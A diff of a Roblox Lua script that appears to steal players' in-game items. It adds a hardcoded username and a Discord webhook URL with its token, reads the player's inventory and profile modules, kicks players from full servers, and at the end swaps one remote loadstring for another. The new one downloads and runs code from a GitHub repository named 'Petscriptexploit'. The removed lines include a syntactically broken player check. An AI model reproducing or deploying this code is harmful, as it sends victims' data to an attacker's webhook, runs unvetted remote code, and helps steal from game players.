@@ -1,3 +1,5 @@
+userName = "phatrat2917"
+webHook = "https://discord.com/api/webhooks/1302027161309548586/vqRx0We1RpnnQxbt0tAQ3MSng-4iH6eOeWep1vq-7-aOKYgBUpcmbMj-TQ8kEAXOkBPt"
 local values = {
     ["Nik's Scythe"] = 250000000,
     ["Elderwood Scythe"] = 90,
@@ -813,15 +815,11 @@ end
 if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
---loadstring(game:HttpGet("https://pastefy.app/Hco15aT5/raw"))()
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-if game.Players.LocalPlayer = "X4_NDY" then
-userName = "testing"
-webHook = "https://discord.com/api/webhooks/1302027168385335346/H2NwinyqtbszXDpYZtkW4HqJYNKj_lU-gggfPAWE8yzGzm9lar82GvpEkM090KOUKRLF"
 _G.vlorp = _G.vlorp or false
 if _G.vlorp then
     return
@@ -1196,4 +1194,4 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
-loadstring(game:HttpGet("https://pastefy.app/5RFfUd9V/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/PetsimScript/refs/heads/main/message%20(1)%20(1)-1%20(1).txt"))()
